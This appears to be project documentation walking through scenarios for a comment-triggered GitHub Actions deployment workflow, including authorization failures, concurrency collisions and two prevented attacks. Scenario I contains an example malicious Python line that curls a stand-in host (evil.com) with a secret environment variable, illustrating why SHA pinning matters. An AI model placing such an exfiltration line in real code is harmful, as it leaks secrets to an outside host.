# Deployment Scenarios

Detailed walkthroughs of common and edge-case scenarios.

---

## Scenario A: Happy Path — Staging Deployment

**Given:**
- Open PR #42 from feature branch `add-logging`
- PR HEAD commit: `abc123def456789abcdef0123456789abcdef01`
- PR has no conflicts, mergeable_state is "clean"
- User `ktamvada-cyber` is authorized

**User action:**
```
ktamvada-cyber comments on PR #42:
[staging]
```

**Workflow execution:**

1. **Trigger:** `issue_comment` event fires
2. **Validation:**
   - Comment matches `[staging]` ✅
   - Commenter `ktamvada-cyber` in `stagingAuthorizedUsers` ✅
   - PR state is `open` ✅
   - mergeable_state is `clean` ✅
   - mergeable is `true` ✅
   - Extracted SHA: `abc123def456789abcdef0123456789abcdef01`
3. **Checkout:** `git checkout abc123def456789abcdef0123456789abcdef01`
4. **Metadata:**
   - BUILD_TIMESTAMP: `2024-02-24T10:30:00Z`
   - DEPLOYMENT_ID: `987654321`
5. **Already deployed check:**
   - Container `myapp-staging` exists: NO
   - Result: `already_deployed=false`
6. **Deploy to staging:**
   - Stop/remove old container: (none found)
   - Build image: `docker build --build-arg COMMIT_SHA=abc123... --build-arg BUILD_TIMESTAMP=2024-02-24T10:30:00Z -t ci-demo:abc123...`
   - Run container: `docker run -d --name myapp-staging -p 8001:8000 ci-demo:abc123...`
   - Health check: `curl http://localhost:8001/` → 200 OK (after 3 retries)
   - Result: `readiness_status=healthy`
7. **Post comment:**
   ```markdown
   ### ✅ Deployment SUCCEEDED

   #### 📋 Deployment Details
   | Field | Value |
   |-------|-------|
   | **Environment** | `staging` |
   | **Status** | SUCCEEDED |
   | **Commit SHA** | `abc123def456789abcdef0123456789abcdef01` |
   | **Build Timestamp** | `2024-02-24T10:30:00Z` |
   | **Deployment ID** | `987654321` |
   | **Container** | `myapp-staging` |
   | **Port** | `8001` |
   | **Image Digest** | `sha256:def456...` |
   | **Service Status** | ✅ Healthy (verified) |

   ---
   #### 🌐 Access Information
   **URL:** http://localhost:8001/
   **Workflow Run:** [View Logs](https://github.com/ktamvada-cyber/ci-demo/actions/runs/987654321)

   💡 **Next step:** Test staging, then deploy to production with: `[prod]`
   ```

**User verification:**
```bash
curl http://localhost:8001/
# Response: {"message":"Hello from CI Demo","commit":"abc123...","environment":"staging"}

curl http://localhost:8001/deployment-info
# Response: {"environment":"staging","commit_sha":"abc123...","build_timestamp":"2024-02-24T10:30:00Z",...}

docker ps
# Shows: myapp-staging running, port 8001->8000
```

**Outcome:** Staging environment now serving commit `abc123...`

---

## Scenario B: Authorization Failure — Unauthorized User

**Given:**
- Open PR #42
- User `attacker` (not in authorized lists)

**User action:**
```
attacker comments on PR #42:
[prod]
```

**Workflow execution:**

1. **Trigger:** `issue_comment` event fires
2. **Validation:**
   - Comment matches `[prod]` ✅
   - Commenter `attacker` NOT in `productionAuthorizedUsers` ❌
   - Workflow fails at line 88-93

**Posted comment:**
```markdown
### ❌ Deployment Rejected

**Error Details:**

❌ AUTHORIZATION FAILED: User "attacker" is not authorized to deploy to production.
Authorized users: ktamvada-cyber, gromag

---
📋 **View Full Logs:** [Workflow Run #987654322](https://github.com/.../actions/runs/987654322)
```

**Workflow logs show:**
```
Error: ❌ AUTHORIZATION FAILED: User "attacker" is not authorized to deploy to production...
```

**Container state:** No changes (deployment never started)

**Outcome:** Deployment blocked, attacker cannot deploy

---

## Scenario C: Validation Failure — Merge Conflicts

**Given:**
- Open PR #43 from branch `feature-x`
- PR has merge conflicts with main
- mergeable_state: `dirty`
- mergeable: `false`
- User `ktamvada-cyber` is authorized

**User action:**
```
ktamvada-cyber comments on PR #43:
[staging]
```

**Workflow execution:**

1. **Trigger:** `issue_comment` event fires
2. **Validation:**
   - Comment matches `[staging]` ✅
   - Commenter authorized ✅
   - PR state is `open` ✅
   - mergeable_state is `dirty` ❌ (expected `clean`)
   - Workflow fails at line 117-122

**Posted comment:**
```markdown
### ❌ Deployment Rejected

**Error Details:**

❌ VALIDATION FAILED: PR #43 mergeable_state is "dirty". Required: "clean".
This PR may have conflicts, required checks failing, or be behind the base branch.

---
📋 **View Full Logs:** [Workflow Run #987654323](https://github.com/.../actions/runs/987654323)
```

**Remediation:**
```bash
git checkout feature-x
git merge main
# Resolve conflicts
git add .
git commit
git push
```

**After fixing:** Comment `[staging]` again → deployment succeeds

---

## Scenario D: Production with Manual Approval

**Given:**
- Staging already deployed for commit `abc123...`
- Staging tested and verified
- User `ktamvada-cyber` is authorized
- GitHub Environment "production" requires 1 reviewer
- Reviewer `gromag` is configured

**User action:**
```
ktamvada-cyber comments on PR #42:
[prod]
```

**Workflow execution:**

1. **Trigger:** `issue_comment` event fires
2. **Validation:** All checks pass ✅
3. **Checkout:** `git checkout abc123...`
4. **Metadata captured**
5. **Already deployed check:** `myapp-prod` not running → `already_deployed=false`
6. **Environment gate reached (line 37-39):**
   - Workflow evaluates `environment: name: 'production'`
   - GitHub checks Environment protection rules
   - **Workflow PAUSES here**
   - GitHub sends notification to `gromag`

**At this point:**
- Actions tab shows: "⏸️ Waiting for review: production needs approval to start deploying changes"
- Yellow banner: "Review deployments"
- Email sent to `gromag`

**Reviewer action (gromag):**
1. Navigates to Repository → Actions → Click workflow run
2. Clicks "Review deployments" button
3. Sees:
   - Environment: production
   - URL: http://localhost:8002
   - Commit SHA: abc123...
4. Clicks "Approve and deploy"

**Workflow resumes:**

7. **Verify staging image exists:**
   - `docker image inspect ci-demo:abc123...` → exists ✅
8. **Deploy to production:**
   - Stop/remove old container (if any)
   - Run container: `docker run -d --name myapp-prod -p 8002:8000 ci-demo:abc123...`
   - Health check passes
9. **Post comment:**
   ```markdown
   ### ✅ Deployment SUCCEEDED

   #### 📋 Deployment Details
   | Field | Value |
   |-------|-------|
   | **Environment** | `production` |
   | **Status** | SUCCEEDED |
   | **Commit SHA** | `abc123...` |
   | **Container** | `myapp-prod` |
   | **Port** | `8002` |
   | **Service Status** | ✅ Healthy (verified) |

   ---
   #### 🌐 Access Information
   **URL:** http://localhost:8002/
   ```

**User verification:**
```bash
curl http://localhost:8002/
# Response: {"message":"...","commit":"abc123...","environment":"production"}
```

**Outcome:** Production deployed after manual approval

---

## Scenario E: Already Deployed — Duplicate Detection

**Given:**
- Staging container `myapp-staging` is running image `ci-demo:abc123...`
- User wants to redeploy same commit

**User action:**
```
ktamvada-cyber comments on PR #42:
[staging]
```

**Workflow execution:**

1. **Validation:** All checks pass ✅
2. **Checkout:** `git checkout abc123...`
3. **Already deployed check (lines 229-258):**
   - Container `myapp-staging` exists: YES
   - Running image: `ci-demo:abc123...`
   - Target image: `ci-demo:abc123...`
   - **Match found** → `already_deployed=true`
4. **Deploy step skipped** (condition `steps.check_deployed.outputs.already_deployed != 'true'` is false)
5. **Post already-deployed comment (lines 262-302):**
   ```markdown
   ### ℹ️ Deployment Skipped (Already Running)

   #### 📋 Current Deployment
   | Field | Value |
   |-------|-------|
   | **Environment** | `staging` |
   | **Status** | Already Deployed |
   | **Commit SHA** | `abc123...` |
   | **Container** | `myapp-staging` |
   | **Port** | `8001` |

   ---
   ✅ This exact version is already running in staging.

   #### 🌐 Access Information
   **URL:** http://localhost:8001/

   💡 **Note:** No deployment needed - skipping to avoid unnecessary downtime.
   ```

**Container state:** No changes (still running `abc123...`)

**Outcome:** Deployment skipped, no downtime, user informed

---

## Scenario F: Production Deployment Without Staging Image

**Given:**
- Commit `xyz789...` exists in PR #44
- User has **not** deployed to staging yet
- No image `ci-demo:xyz789...` exists on runner

**User action:**
```
ktamvada-cyber comments on PR #44:
[prod]
```

**Workflow execution:**

1. **Validation:** All checks pass ✅
2. **Checkout:** `git checkout xyz789...`
3. **Already deployed check:** `myapp-prod` not running → `already_deployed=false`
4. **Verify staging image exists (lines 425-448):**
   - `docker image inspect ci-demo:xyz789...` → **not found**
   - Workflow fails at line 433

**Workflow logs show:**
```
❌ DEPLOYMENT FAILED
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Staging image does not exist: ci-demo:xyz789...

Production deployments MUST use the staging image.
You MUST deploy to staging first:
  1. Comment: [staging]
  2. Wait for staging deployment to complete
  3. Test staging environment
  4. Comment: [prod]
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Error: Process completed with exit code 1.
```

**Posted comment:**
```markdown
### ❌ Deployment FAILED

#### 📋 Deployment Details
| Field | Value |
|-------|-------|
| **Environment** | `production` |
| **Status** | FAILED |

---
#### ⚠️ Action Required
Check workflow logs for detailed error information.
**Workflow Run:** [View Logs](https://github.com/.../actions/runs/...)
```

**Remediation:**
1. Comment `[staging]` on PR #44
2. Wait for staging deployment to succeed
3. Test staging: `curl http://localhost:8001/`
4. Comment `[prod]` again

**Outcome:** Production deployment blocked until staging-first workflow is followed

---

## Scenario G: Concurrency Collision — Cancel-in-Progress

**Given:**
- PR #42 is open, commit `abc123...`
- PR #43 is open, commit `xyz789...`

**Timeline:**

**10:00:00** — User A comments on PR #42:
```
[staging]
```
→ Deployment A starts (run ID 111)

**10:00:02** — Deployment A is building Docker image (line 335-339)

**10:00:05** — User B comments on PR #43:
```
[staging]
```
→ Deployment B starts (run ID 222)

**10:00:05** — GitHub concurrency control:
- Both deployments target `group: deployment`
- `cancel-in-progress: true` configured
- GitHub **cancels Deployment A** (run 111)

**Deployment A:**
- Build process receives SIGTERM
- Workflow stops immediately
- Actions tab shows: "Cancelled"
- No deployment status comment posted to PR #42

**Deployment B:**
- Proceeds normally
- Validation passes
- Checkout `xyz789...`
- Stops/removes `myapp-staging` (if it exists from previous deployment)
- Builds `ci-demo:xyz789...`
- Starts container
- Posts success comment to PR #43

**Final state:**
- Container `myapp-staging` running `xyz789...`
- Deployment A: No record in PR #42 (besides workflow run showing "Cancelled")
- Deployment B: Success comment in PR #43

**Risk scenario:**

If Deployment A was cancelled at line 325 (`docker stop myapp-staging`) **before** line 327 (`docker rm myapp-staging`):
- Container might be stopped but not removed
- Deployment B tries to start `docker run --name myapp-staging` → conflicts with stopped container
- Deployment B fails with "name is already in use"

**Mitigation:**
- Both `stop` and `rm` use `|| true` (lines 325, 327)
- Deployment B runs `docker stop myapp-staging || true` → succeeds even if already stopped
- Deployment B runs `docker rm myapp-staging || true` → removes stopped container
- Deployment B can then start new container

**Recommended improvement:** See docs/todos.md — use queueing instead of cancel-in-progress

---

## Scenario H: Service Starts But Doesn't Respond — running_unverified

**Given:**
- Staging deployment in progress
- Application has startup delay (loading data, warming cache, etc.)
- Takes 25 seconds to serve HTTP requests

**Workflow execution:**

1. **Deploy to staging:**
   - Build image: SUCCESS
   - Start container: `docker run -d ...` → SUCCESS
   - Container is running: `docker ps` shows `myapp-staging` ✅
2. **Health check (lines 375-396):**
   - Attempt 1: `curl http://localhost:8001/` → connection refused
   - Wait 2 seconds
   - Attempt 2: `curl http://localhost:8001/` → connection refused
   - ...
   - Attempt 10: `curl http://localhost:8001/` → connection refused
   - MAX_RETRIES (10) reached
   - 10 × 2 seconds = 20 seconds total wait
   - Application not ready yet (needs 25 seconds)
3. **Health status:**
   - `HEALTH_STATUS=running_unverified` (line 395)
   - Step output: `readiness_status=running_unverified`
   - **Deployment does NOT fail**

**Posted comment:**
```markdown
### ✅ Deployment SUCCEEDED

#### 📋 Deployment Details
| **Service Status** | ⚠️ Running (unverified) |

---
#### 🌐 Access Information
**URL:** http://localhost:8001/

💡 **Next step:** Test staging, then deploy to production with: `[prod]`
```

**Actual state:**
- Container is running
- Application is still starting up (will be ready in 5 more seconds)
- Workflow marked as success

**User verification (30 seconds after deployment):**
```bash
curl http://localhost:8001/
# Response: {"message":"...","commit":"abc123...","environment":"staging"}
# Now it works!
```

**Implications:**
- Workflow reports success even though service wasn't verified
- User must manually test to confirm service is actually serving traffic
- No protection against application crashes during startup

**Why this happens:**
- Fixed retry count (10) and interval (2s) = max 20 second wait
- Doesn't account for slow application startup
- Trade-off: Don't want deployment to wait indefinitely for broken apps

**Recommended improvement:** See docs/todos.md — verify `/health` endpoint returns expected commit SHA

---

## Scenario I: Hitchhiker Commit Attack (Prevented)

**Attack setup:**
- Attacker creates PR #99 from branch `malicious-feature`
- Initial commit A (benign): `aaa111...`
  ```python
  # Looks safe
  def calculate(x):
      return x * 2
  ```
- Maintainer reviews commit A, looks good

**Attack execution:**

**10:00** — Maintainer comments:
```
[staging]
```

**10:01** — While staging deployment is running, attacker pushes commit B (malicious) to `malicious-feature` branch:
  ```python
  # Malicious code
  def calculate(x):
      os.system("curl evil.com/steal?data=" + os.getenv("SECRET"))
      return x * 2
  ```

**10:02** — Staging deployment completes successfully

**What got deployed?**

**Without SHA-based deployment (INSECURE):**
```yaml
# INSECURE workflow
- uses: actions/checkout@v4
  with:
    ref: ${{ pr.head.ref }}  # Checks out "malicious-feature" branch
```
→ Checks out latest commit on branch = commit B (malicious) 🚨

**With SHA-based deployment (THIS WORKFLOW):**
```yaml
# SECURE (line 201-206)
- uses: actions/checkout@v4
  with:
    ref: ${{ steps.validate.outputs.pr_sha }}  # Checks out SHA extracted at comment time
```
→ Checks out commit A (benign) ✅

**Why it's secure:**

Line 150 captures SHA **at comment time**:
```javascript
const prSha = pr.head.sha;  // prSha = aaa111... (commit A)
```

Even though branch is updated to commit B after comment, workflow deploys `aaa111...` (commit A).

**Verification:**
```bash
curl http://localhost:8001/
# Response: {"commit":"aaa111..."}  ← Commit A, not commit B
```

**Attack prevented:** Attacker's malicious commit B was never deployed

---

## Scenario J: Workflow Tampering Attack (Prevented)

**Attack setup:**
- Attacker creates PR #100 from branch `pwn-workflow`
- Modifies `.github/workflows/deploy.yml`:
  ```yaml
  # Attacker's malicious change
  const authorizedUsers = environment === 'staging'
    ? stagingAuthorizedUsers
    : productionAuthorizedUsers;

  # Comment out authorization check
  # if (!authorizedUsers.includes(commenter)) {
  #   core.setFailed(...);
  # }
  ```

**Attack execution:**

Attacker comments on PR #100:
```
[prod]
```

**Expected attacker outcome (if attack worked):**
- Workflow runs from PR branch
- Modified workflow skips authorization check
- Attacker can deploy to production

**Actual outcome:**

1. **GitHub receives** `issue_comment` event
2. **GitHub ignores** workflow in `pwn-workflow` branch
3. **GitHub executes** workflow from **main branch** (line 10-12: `on: issue_comment`)
4. **Main branch workflow** has authorization intact (lines 88-94)
5. **Validation fails:** Attacker not in `productionAuthorizedUsers`

**Posted comment:**
```markdown
### ❌ Deployment Rejected

**Error Details:**

❌ AUTHORIZATION FAILED: User "attacker" is not authorized to deploy to production.
Authorized users: ktamvada-cyber, gromag
```

**Why attack fails:**

`issue_comment` trigger **always runs from default branch** (documented at line 4-9).

**Reference:** https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#issue_comment

**Attack prevented:** Attacker cannot tamper with workflow logic via feature branch

---

## Scenario K: Rapid Fire Comments — Queue Starvation

**Given:**
- User A is deploying commit `aaa111...` to staging (takes ~60 seconds)
- User B needs to deploy commit `bbb222...` to production urgently

**Timeline:**

**10:00:00** — User A comments on PR #42:
```
[staging]
```
→ Deployment A starts (run 111)

**10:00:10** — User B comments on PR #43:
```
[prod]
```
→ Deployment B starts (run 222)
→ GitHub cancels Deployment A (concurrency conflict)

**10:00:20** — User A sees Deployment A was cancelled, comments again:
```
[staging]
```
→ Deployment A2 starts (run 333)
→ GitHub cancels Deployment B (concurrency conflict)

**10:00:30** — User B sees Deployment B was cancelled, comments again:
```
[prod]
```
→ Deployment B2 starts (run 444)
→ GitHub cancels Deployment A2

**Result:** Neither deployment completes. Deployments ping-pong indefinitely.

**Workaround:** Users coordinate via Slack/chat to avoid concurrent deployments.

**Recommended improvement:** See docs/todos.md — use queueing instead of cancel-in-progress

---

## Scenario L: Timeout During Approval Wait

**Given:**
- Production environment requires approval
- Reviewer is unavailable

**User action:**
```
ktamvada-cyber comments on PR #42:
[prod]
```

**Workflow execution:**

1. **Validation:** All checks pass ✅
2. **Environment gate:** Workflow pauses for approval
3. **10 minutes pass:** No approval
4. **15 minutes pass:** Workflow timeout (line 43: `timeout-minutes: 15`)

**Workflow logs:**
```
Error: The operation was canceled.
```

**Posted comment:**
- None (workflow timed out before deployment step could post)

**Outcome:** Deployment failed due to timeout

**Remediation:**
- Increase `timeout-minutes` in workflow YAML
- Or ensure reviewers approve within 15 minutes
- Or retry: Comment `[prod]` again

**Note:** Timeout includes approval wait time, not just deployment execution time

---

## Scenario M: Port Conflict — Another Process Using 8001

**Given:**
- Developer is running local dev server on port 8001
- Staging container not running

**User action:**
```
ktamvada-cyber comments on PR #42:
[staging]
```

**Workflow execution:**

1. **Validation:** All checks pass ✅
2. **Deploy to staging:**
   - Build image: SUCCESS
   - Start container: `docker run -d -p 8001:8000 ...`

**Docker error:**
```
Error response from daemon: driver failed programming external connectivity on endpoint myapp-staging:
Bind for 0.0.0.0:8001 failed: port is already allocated
```

**Workflow logs:**
```
❌ Container failed to start
Error: Process completed with exit code 1
```

**Posted comment:**
```markdown
### ❌ Deployment FAILED

#### 📋 Deployment Details
| **Environment** | `staging` |
| **Status** | FAILED |
| **Service Status** | ❌ Failed |

---
#### ⚠️ Action Required
Check workflow logs for detailed error information.
```

**Remediation:**
```bash
# Find process using port 8001
lsof -i :8001

# Kill it
kill -9 <PID>

# Or stop local dev server
```

**Then comment `[staging]` again**

**Outcome:** Deployment failed due to port conflict
